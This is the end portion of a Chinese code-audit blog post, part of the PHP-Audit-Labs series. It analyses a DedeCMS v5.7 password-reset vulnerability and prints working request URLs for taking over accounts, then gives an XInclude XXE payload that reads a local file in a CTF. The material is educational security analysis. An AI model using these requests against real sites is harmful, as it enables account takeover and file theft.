+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">sn</span><span class="params">($mid,$userid,$mailto, $send = <span class="string">&apos;Y&apos;</span>)</span></span></span><br><span class="line"><span class="function"></span>{</span><br><span class="line">    <span class="keyword">global</span> $db;</span><br><span class="line">    $tptim= (<span class="number">60</span>*<span class="number">10</span>);</span><br><span class="line">    $dtime = time();</span><br><span class="line">    $sql = <span class="string">&quot;SELECT * FROM #@__pwd_tmp WHERE mid = &apos;$mid&apos;&quot;</span>;</span><br><span class="line">    $row = $db-&gt;GetOne($sql);</span><br><span class="line">    <span class="keyword">if</span>(!is_array($row))</span><br><span class="line">    {</span><br><span class="line">        <span class="comment">//&#x53D1;&#x9001;&#x65B0;&#x90AE;&#x4EF6;&#xFF1B;</span></span><br><span class="line">        newmail($mid,$userid,$mailto,<span class="string">&apos;INSERT&apos;</span>,$send);</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">//10&#x5206;&#x949F;&#x540E;&#x53EF;&#x4EE5;&#x518D;&#x6B21;&#x53D1;&#x9001;&#x65B0;&#x9A8C;&#x8BC1;&#x7801;&#xFF1B;</span></span><br><span class="line">    <span class="keyword">elseif</span>($dtime - $tptim &gt; $row[<span class="string">&apos;mailtime&apos;</span>])</span><br><span class="line">    {</span><br><span class="line">        newmail($mid,$userid,$mailto,<span class="string">&apos;UPDATE&apos;</span>,$send);</span><br><span class="line">    }</span><br><span class="line">    <span class="comment">//&#x91CD;&#x65B0;&#x53D1;&#x9001;&#x65B0;&#x7684;&#x9A8C;&#x8BC1;&#x7801;&#x786E;&#x8BA4;&#x90AE;&#x4EF6;&#xFF1B;</span></span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">return</span> ShowMsg(<span class="string">&apos;&#x5BF9;&#x4E0D;&#x8D77;&#xFF0C;&#x8BF7;10&#x5206;&#x949F;&#x540E;&#x518D;&#x91CD;&#x65B0;&#x7533;&#x8BF7;&apos;</span>, <span class="string">&apos;login.php&apos;</span>);</span><br><span class="line">    }</span><br><span class="line">}</span><br></pre></td></tr></table></figure>
+
+<p>&#x7B2C;&#x4E00;&#x6B21;&#x53D1;&#x9001;&#x9A8C;&#x8BC1;&#x7801;&#x65F6;&#x4ECE;&#x8868;&#x4E2D;&#x53D6;&#x503C;&#x4E3A;&#x7A7A;&#xFF0C;&#x8FDB;&#x5165; <strong>&#x7B2C; 11 &#x884C;</strong> <code>newmail()</code> &#x51FD;&#x6570;&#x3002;&#x76F8;&#x5173;&#x64CD;&#x4F5C;&#x4EE3;&#x7801;&#x4F4D;&#x7F6E;&#x5728; <strong>member/inc/inc_pwd_functions.php</strong>&#xFF0C;&#x5173;&#x952E;&#x4EE3;&#x7801;&#x5982;&#x4E0B;&#xFF1A;</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>($type == <span class="string">&apos;INSERT&apos;</span>)</span><br><span class="line">    {</span><br><span class="line">        $key = md5($randval);</span><br><span class="line">        $sql = <span class="string">&quot;INSERT INTO `#@__pwd_tmp` (`mid` ,`membername` ,`pwd` ,`mailtime`)VALUES (&apos;$mid&apos;, &apos;$userid&apos;,  &apos;$key&apos;, &apos;$mailtime&apos;);&quot;</span>;</span><br><span class="line">        <span class="keyword">if</span>($db-&gt;ExecuteNoneQuery($sql))</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">if</span>($send == <span class="string">&apos;Y&apos;</span>)</span><br><span class="line">            {</span><br><span class="line">                sendmail($mailto,$mailtitle,$mailbody,$headers);</span><br><span class="line">                <span class="keyword">return</span> ShowMsg(<span class="string">&apos;EMAIL&#x4FEE;&#x6539;&#x9A8C;&#x8BC1;&#x7801;&#x5DF2;&#x7ECF;&#x53D1;&#x9001;&#x5230;&#x539F;&#x6765;&#x7684;&#x90AE;&#x7BB1;&#x8BF7;&#x67E5;&#x6536;&apos;</span>, <span class="string">&apos;login.php&apos;</span>,<span class="string">&apos;&apos;</span>,<span class="string">&apos;5000&apos;</span>);</span><br><span class="line">            } <span class="keyword">else</span> <span class="keyword">if</span> ($send == <span class="string">&apos;N&apos;</span>)</span><br><span class="line">            {</span><br><span class="line">                <span class="keyword">return</span> ShowMsg(<span class="string">&apos;&#x7A0D;&#x540E;&#x8DF3;&#x8F6C;&#x5230;&#x4FEE;&#x6539;&#x9875;&apos;</span>, $cfg_basehost.$cfg_memberurl.<span class="string">&quot;/resetpassword.php?dopost=getpasswd&amp;amp;id=&quot;</span>.$mid.<span class="string">&quot;&amp;amp;key=&quot;</span>.$randval);</span><br><span class="line">            }</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">return</span> ShowMsg(<span class="string">&apos;&#x5BF9;&#x4E0D;&#x8D77;&#x4FEE;&#x6539;&#x5931;&#x8D25;&#xFF0C;&#x8BF7;&#x8054;&#x7CFB;&#x7BA1;&#x7406;&#x5458;&apos;</span>, <span class="string">&apos;login.php&apos;</span>);</span><br><span class="line">        }</span><br><span class="line">    }</span><br></pre></td></tr></table></figure>
+
+<p><code>resetpassword.php</code> &#x4F20;&#x5165;&#x7684;<code>$send = &apos;N&apos;</code>&#xFF0C;&#x5C06;&#x901A;&#x8FC7; <strong>ShowMsg</strong> &#x51FD;&#x6570;&#x76F4;&#x63A5;&#x6253;&#x5370;&#x4FEE;&#x6539;&#x5BC6;&#x7801;&#x529F;&#x80FD;&#x7684;&#x94FE;&#x63A5;&#x3002;<strong>&#x7B2C; 13 &#x884C;</strong> &#x4FEE;&#x6539;&#x5BC6;&#x7801;&#x94FE;&#x63A5;&#x4E2D;&#x7684; <strong>$mid</strong> &#x53C2;&#x6570;&#x5BF9;&#x5E94;&#x7684;&#x503C;&#x662F;&#x7528;&#x6237; <strong>id</strong>&#xFF0C;<strong>$randval</strong> &#x5728;&#x7B2C;&#x4E00;&#x6B21; <strong>insert</strong> &#x64CD;&#x4F5C;&#x65F6;&#xFF0C;&#x88AB; MD5 &#x52A0;&#x5BC6;&#x540E;&#x63D2;&#x5165;&#x5230; <strong>pwd_tmp</strong> &#x8868;&#x4E2D;&#xFF0C;&#x7528;&#x4E8E;&#x540E;&#x7EED;&#x91CD;&#x7F6E;&#x5BC6;&#x7801;&#x65F6;&#xFF0C;&#x9A8C;&#x8BC1;&#x91CD;&#x7F6E;&#x94FE;&#x63A5;&#x5408;&#x6CD5;&#x6027;&#x3002;&#x56E0;&#x6B64;&#xFF0C;&#x8FD9;&#x91CC;&#x62FC;&#x63A5;&#x7684; URL &#x5176;&#x5B9E;&#x662F;&#xFF1A;</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/member/resetpassword.php?dopost=getpasswd&amp;id=$mid&amp;key=$randval</span><br></pre></td></tr></table></figure>
+
+<p>&#x83B7;&#x53D6;&#x5230;&#x91CD;&#x7F6E;&#x5BC6;&#x7801;&#x94FE;&#x63A5;&#x540E;&#xFF0C;&#x7EE7;&#x7EED;&#x8DDF;&#x8FDB;&#x94FE;&#x63A5;&#x4E2D;&#x7684; <code>dopost=getpasswd</code> &#x64CD;&#x4F5C;&#xFF0C;&#x5173;&#x952E;&#x4EE3;&#x7801;&#x5982;&#x4E0B;&#xFF1A;</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>($dopost == <span class="string">&quot;getpasswd&quot;</span>)</span><br><span class="line">{</span><br><span class="line">    <span class="comment">//&#x4FEE;&#x6539;&#x5BC6;&#x7801;</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($id))</span><br><span class="line">    {</span><br><span class="line">        ShowMsg(<span class="string">&quot;&#x5BF9;&#x4E0D;&#x8D77;&#xFF0C;&#x8BF7;&#x4E0D;&#x8981;&#x975E;&#x6CD5;&#x63D0;&#x4EA4;&quot;</span>,<span class="string">&quot;login.php&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    }</span><br><span class="line">    $mid = preg_replace(<span class="string">&quot;#[^0-9]#&quot;</span>, <span class="string">&quot;&quot;</span>, $id);</span><br><span class="line">    $row = $db-&gt;GetOne(<span class="string">&quot;SELECT * FROM #@__pwd_tmp WHERE mid = &apos;$mid&apos;&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">empty</span>($row))</span><br><span class="line">    {</span><br><span class="line">        ShowMsg(<span class="string">&quot;&#x5BF9;&#x4E0D;&#x8D77;&#xFF0C;&#x8BF7;&#x4E0D;&#x8981;&#x975E;&#x6CD5;&#x63D0;&#x4EA4;&quot;</span>,<span class="string">&quot;login.php&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    }</span><br></pre></td></tr></table></figure>
+
+<p>&#x4F9D;&#x636E; <code>$id</code> &#x4ECE;&#x4E4B;&#x524D;&#x63D2;&#x5165;&#x4E34;&#x65F6;&#x5BC6;&#x7801;&#x7684; <strong>pwd_tmp</strong> &#x8868;&#x4E2D;&#x53D6;&#x51FA;&#x6570;&#x636E;&#xFF0C;&#x5224;&#x65AD;&#x7528;&#x6237;&#x662F;&#x5426;&#x6267;&#x884C;&#x8FC7;&#x91CD;&#x7F6E;&#x5BC6;&#x7801;&#x64CD;&#x4F5C;&#x3002;&#x5982;&#x679C;&#x53D6;&#x51FA;&#x6570;&#x636E;&#x4E0D;&#x4E3A;&#x7A7A;&#xFF0C;&#x6267;&#x884C;&#x4EE5;&#x4E0B;&#x64CD;&#x4F5C;</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>($setp))</span><br><span class="line">    {</span><br><span class="line">        $tptim= (<span class="number">60</span>*<span class="number">60</span>*<span class="number">24</span>*<span class="number">3</span>);</span><br><span class="line">        $dtime = time();</span><br><span class="line">        <span class="keyword">if</span>($dtime - $tptim &gt; $row[<span class="string">&apos;mailtime&apos;</span>])</span><br><span class="line">        {</span><br><span class="line">            $db-&gt;executenonequery(<span class="string">&quot;DELETE FROM `#@__pwd_tmp` WHERE `md` = &apos;$id&apos;;&quot;</span>);</span><br><span class="line">            ShowMsg(<span class="string">&quot;&#x5BF9;&#x4E0D;&#x8D77;&#xFF0C;&#x4E34;&#x65F6;&#x5BC6;&#x7801;&#x4FEE;&#x6539;&#x671F;&#x9650;&#x5DF2;&#x8FC7;&#x671F;&quot;</span>,<span class="string">&quot;login.php&quot;</span>);</span><br><span class="line">            <span class="keyword">exit</span>();</span><br><span class="line">        }</span><br><span class="line">        <span class="keyword">require_once</span>(dirname(<span class="keyword">__FILE__</span>).<span class="string">&quot;/templets/resetpassword2.htm&quot;</span>);</span><br><span class="line">    }</span><br></pre></td></tr></table></figure>
+
+<p>&#x9996;&#x5148;&#x5224;&#x65AD;&#x91CD;&#x7F6E;&#x8BF7;&#x6C42;&#x662F;&#x5426;&#x8D85;&#x65F6;&#xFF0C;&#x672A;&#x8D85;&#x65F6;&#x5219;&#x8FDB;&#x5165;&#x5BC6;&#x7801;&#x4FEE;&#x6539;&#x9875;&#x9762;&#x3002;&#x5728;&#x5BC6;&#x7801;&#x4FEE;&#x6539;&#x9875;&#x9762;&#x4E2D;&#x5C06; <code>$step</code> &#x8D4B;&#x503C;&#x4E3A; <code>2</code></p>
+<p><img src="/2019/11/18/PHP-Audit-Labs-Day4-strpos-&#x4F7F;&#x7528;&#x4E0D;&#x5F53;&#x5F15;&#x53D1;&#x6F0F;&#x6D1E;/2.png" alt="image-20191119104731603"></p>
+<p>&#x7531;&#x4E8E;&#x8FD9;&#x91CC; <code>$dopost=getpasswd | $setp = 2</code>&#xFF0C;&#x4EE3;&#x7801;&#x5B9E;&#x73B0;&#x53C8;&#x56DE;&#x5230;&#x4E86; <code>member/resetpassword.php</code> &#x6587;&#x4EF6;&#x4E2D;</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">elseif</span>($setp == <span class="number">2</span>)</span><br><span class="line">    {</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($key)) $pwdtmp = $key;</span><br><span class="line"></span><br><span class="line">        $sn = md5(trim($pwdtmp));</span><br><span class="line">        <span class="keyword">if</span>($row[<span class="string">&apos;pwd&apos;</span>] == $sn)</span><br><span class="line">        {</span><br><span class="line">            <span class="keyword">if</span>($pwd != <span class="string">&quot;&quot;</span>)</span><br><span class="line">            {</span><br><span class="line">                <span class="keyword">if</span>($pwd == $pwdok)</span><br><span class="line">                {</span><br><span class="line">                    $pwdok = md5($pwdok);</span><br><span class="line">                    $sql = <span class="string">&quot;DELETE FROM `#@__pwd_tmp` WHERE `mid` = &apos;$id&apos;;&quot;</span>;</span><br><span class="line">                    $db-&gt;executenonequery($sql);</span><br><span class="line">                    $sql = <span class="string">&quot;UPDATE `#@__member` SET `pwd` = &apos;$pwdok&apos; WHERE `mid` = &apos;$id&apos;;&quot;</span>;</span><br><span class="line">                    <span class="keyword">if</span>($db-&gt;executenonequery($sql))</span><br><span class="line">                    {</span><br><span class="line">                        showmsg(<span class="string">&apos;&#x66F4;&#x6539;&#x5BC6;&#x7801;&#x6210;&#x529F;&#xFF0C;&#x8BF7;&#x7262;&#x8BB0;&#x65B0;&#x5BC6;&#x7801;&apos;</span>, <span class="string">&apos;login.php&apos;</span>);</span><br><span class="line">                        <span class="keyword">exit</span>;</span><br><span class="line">                    }</span><br><span class="line">                }</span><br><span class="line">            }</span><br><span class="line">            showmsg(<span class="string">&apos;&#x5BF9;&#x4E0D;&#x8D77;&#xFF0C;&#x65B0;&#x5BC6;&#x7801;&#x4E3A;&#x7A7A;&#x6216;&#x586B;&#x5199;&#x4E0D;&#x4E00;&#x81F4;&apos;</span>, <span class="string">&apos;-1&apos;</span>);</span><br><span class="line">            <span class="keyword">exit</span>;</span><br><span class="line">        }</span><br><span class="line">        showmsg(<span class="string">&apos;&#x5BF9;&#x4E0D;&#x8D77;&#xFF0C;&#x4E34;&#x65F6;&#x5BC6;&#x7801;&#x9519;&#x8BEF;&apos;</span>, <span class="string">&apos;-1&apos;</span>);</span><br><span class="line">        <span class="keyword">exit</span>;</span><br><span class="line">    }</span><br></pre></td></tr></table></figure>
+
+<p><strong>&#x7B2C; 6 &#x884C;</strong> &#x5224;&#x65AD;&#x4F20;&#x5165;&#x7684; <strong>$key</strong> &#x662F;&#x5426;&#x7B49;&#x4E8E;&#x6570;&#x636E;&#x5E93;&#x4E2D;&#x7684; <strong>$row[&#x2018;pwd&#x2019;]</strong>&#xFF0C;&#x5982;&#x679C;&#x76F8;&#x7B49;&#x5C31;&#x5B8C;&#x6210;&#x91CD;&#x7F6E;&#x5BC6;&#x7801;&#x64CD;&#x4F5C;</p>
+<h1 id="&#x6F0F;&#x6D1E;&#x5229;&#x7528;"><a href="#&#x6F0F;&#x6D1E;&#x5229;&#x7528;" class="headerlink" title="&#x6F0F;&#x6D1E;&#x5229;&#x7528;"></a>&#x6F0F;&#x6D1E;&#x5229;&#x7528;</h1><p>&#x6CE8;&#x518C;&#x4E00;&#x4E2A;&#x7528;&#x6237; <strong>test1</strong></p>
+<p><img src="/2019/11/18/PHP-Audit-Labs-Day4-strpos-&#x4F7F;&#x7528;&#x4E0D;&#x5F53;&#x5F15;&#x53D1;&#x6F0F;&#x6D1E;/3.png" alt="image-20191119105947307"></p>
+<p>&#x8BBF;&#x95EE; URL &#x6293;&#x5305;&#x83B7;&#x53D6; <strong>Key</strong> &#x503C;</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://localtest.com/DedeCMS/uploads/member/resetpassword.php?dopost=safequestion&amp;safequestion=0.0&amp;safeanswer=&amp;id=2</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/11/18/PHP-Audit-Labs-Day4-strpos-&#x4F7F;&#x7528;&#x4E0D;&#x5F53;&#x5F15;&#x53D1;&#x6F0F;&#x6D1E;/4.png" alt="image-20191119110630589"></p>
+<p>&#x53BB;&#x6389;&#x591A;&#x4F59;&#x5B57;&#x7B26;&#xFF0C;&#x8BBF;&#x95EE;&#x94FE;&#x63A5;&#x5230;&#x8FBE;&#x91CD;&#x7F6E;&#x5BC6;&#x7801;&#x9875;&#x9762;</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/DedeCMS/uploads/member/resetpassword.php?dopost=getpasswd&amp;id=2&amp;key=FXmIIKGP</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2019/11/18/PHP-Audit-Labs-Day4-strpos-&#x4F7F;&#x7528;&#x4E0D;&#x5F53;&#x5F15;&#x53D1;&#x6F0F;&#x6D1E;/5.png" alt="image-20191119110910753"></p>
+<h1 id="&#x603B;&#x7ED3;"><a href="#&#x603B;&#x7ED3;" class="headerlink" title="&#x603B;&#x7ED3;"></a>&#x603B;&#x7ED3;</h1><p>&#x53EF;&#x4EE5;&#x5229;&#x7528;</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?dopost=safequestion&amp;safequestion=0.0&amp;id=xx</span><br><span class="line">?dopost=getpasswd&amp;setp=2&amp;pwd=xxx&amp;pwdok=xxx&amp;id=xx&amp;key=xxxxxxxx</span><br></pre></td></tr></table></figure>
+
+<p>&#x6279;&#x91CF;&#x68C0;&#x6D4B;&#x3001;&#x5229;&#x7528; 233</p>
+<h2 id="Day4-CTF"><a href="#Day4-CTF" class="headerlink" title="Day4 - CTF"></a>Day4 - CTF</h2><p>&#x539F;&#x9898;&#x662F;&#x9ED1;&#x76D2;&#x6D4B;&#x51FA; <strong>.git</strong> &#x6CC4;&#x9732;&#xFF0C;&#x518D;&#x62FF;&#x5230;&#x6E90;&#x7801;&#x767D;&#x76D2;&#x5BA1;&#x8BA1;&#x7684;&#x3002;&#x8FD9;&#x91CC;&#x7ED9;&#x7684;&#x6E90;&#x7801;&#x5305;&#x6CA1;&#x6709;&#x9644; <strong>.git</strong> &#x76EE;&#x5F55;&#xFF0C;&#x5C0F;&#x5751;</p>
+<p>&#x9644;&#x4E0A;&#x6DFB;&#x52A0; <strong>.git</strong> &#x76EE;&#x5F55;&#x540E;&#x7684;&#x73AF;&#x5883;&#xFF0C;<strong>&#x4FB5;&#x5220;</strong></p>
+<p>&#x94FE;&#x63A5;: <a href="https://pan.baidu.com/s/1SukQM9Cc2bkNtbUPgArIUA" target="_blank" rel="noopener">https://pan.baidu.com/s/1SukQM9Cc2bkNtbUPgArIUA</a> &#x63D0;&#x53D6;&#x7801;: 3104</p>
+<h3 id="Xinclude-XXE"><a href="#Xinclude-XXE" class="headerlink" title="Xinclude XXE"></a>Xinclude XXE</h3><p>&#x8FD9;&#x91CC;&#x5199;&#x4E0A;&#x9762; <strong>Xinclude XXE</strong> &#x7684; <strong>WriteUP</strong>&#xFF1A;</p>
+<p>Payload&#xFF1A;</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=&gt;&quot;&gt;<span class="tag">&lt;/<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">root</span> <span class="attr">xmlns:xi</span>=<span class="string">&quot;http://www.w3.org/2001/XInclude&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">xi:include</span> <span class="attr">href</span>=<span class="string">&quot;file:///D:/MAMP/htdocs/Xinclude/flag.php&quot;</span> <span class="attr">parse</span>=<span class="string">&quot;text&quot;</span>/&gt;</span><span class="tag">&lt;/<span class="name">root</span>&gt;</span><span class="tag">&lt;<span class="name">user</span> <span class="attr">v</span>=<span class="string">&quot;a&amp;password=</span></span></span><br></pre></td></tr></table></figure>
+
+<p>&#x8FD9;&#x6837;&#x811A;&#x672C;&#x6267;&#x884C;&#x7684; <strong>XML</strong> &#x6587;&#x4EF6;&#x5C31;&#x53D8;&#x6210;&#x4E86;</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span><br><span class="line">&lt;test&gt;</span><br><span class="line">&lt;user v=&quot;&gt;&quot;&gt;&lt;/user&gt;</span><br><span class="line">&lt;root xmlns:xi=&quot;http://www.w3.org/2001/XInclude&quot;&gt;&lt;xi:include href=&quot;file:///D:/MAMP/htdocs/Xinclude/flag.php&quot; parse=&quot;text&quot;/&gt;&lt;/root&gt;</span><br><span class="line">&lt;user v=&quot;a&quot;&gt;&lt;/user&gt;</span><br><span class="line">&lt;pass v=&quot;&quot;&gt;&lt;/pass&gt;</span><br><span class="line">&lt;/test&gt;</span><br></pre></td></tr></table></figure>
+
+<p>&#x6210;&#x529F;&#x8BFB;&#x53D6;&#x5230; <strong>flag.php</strong> &#x503C;</p>
+<p><img src="/2019/11/18/PHP-Audit-Labs-Day4-strpos-&#x4F7F;&#x7528;&#x4E0D;&#x5F53;&#x5F15;&#x53D1;&#x6F0F;&#x6D1E;/7.png" alt="image-20191120095626555"></p>
+<h1 id="Refer"><a href="#Refer" class="headerlink" title="Refer"></a>Refer</h1><p><a href="https://github.com/hongriSec/PHP-Audit-Labs/blob/master/Part1/Day4/files/README.md" target="_blank" rel="noopener">[&#x7EA2;&#x65E5;&#x5B89;&#x5168;]&#x4EE3;&#x7801;&#x5BA1;&#x8BA1;Day4 - strpos&#x4F7F;&#x7528;&#x4E0D;&#x5F53;&#x5F15;&#x53D1;&#x6F0F;&#x6D1E;</a> </p>
+<p><a href="https://www.anquanke.com/post/id/156227" target="_blank" rel="noopener">&#x6D45;&#x6790;xml&#x4E4B;xinclude &amp; xslt</a></p>
+<p><a href="https://stackoverflow.com/questions/22463154/unescaped-not-allowed-in-attributes-values-error-in-r" target="_blank" rel="noopener">https://stackoverflow.com/questions/22463154/unescaped-not-allowed-in-attributes-values-error-in-r</a> </p>
+<p><a href="https://paper.seebug.org/507/" target="_blank" rel="noopener">DeDeCMS v5.7 &#x5BC6;&#x7801;&#x4FEE;&#x6539;&#x6F0F;&#x6D1E;&#x5206;&#x6790;</a></p>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>c0r1</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://www.c0r1.com/2019/11/18/PHP-Audit-Labs-Day4-strpos-使用不当引发漏洞/">http://www.c0r1.com/2019/11/18/PHP-Audit-Labs-Day4-strpos-使用不当引发漏洞/</a></span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>License:</span>
+                        <span>Copyright (c) 2019 <a href="http://creativecommons.org/licenses/by-nc/4.0/">CC-BY-NC-4.0</a> LICENSE</span>
+                    </p>
+                
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/代码审计/"># 代码审计</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2019/11/12/XXE-学习笔记/">XXE 学习笔记</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+        </div>
+        <footer id="footer" class="footer">
+    <div class="copyright">
+        <span>© c0r1 | Powered by <a href="https://hexo.io" target="_blank">Hexo</a> & <a href="https://github.com/Siricee/hexo-theme-Chic" target="_blank">Chic</a></span>
+    </div>
+</footer>
+
+    </div>
+</body>
+</html>
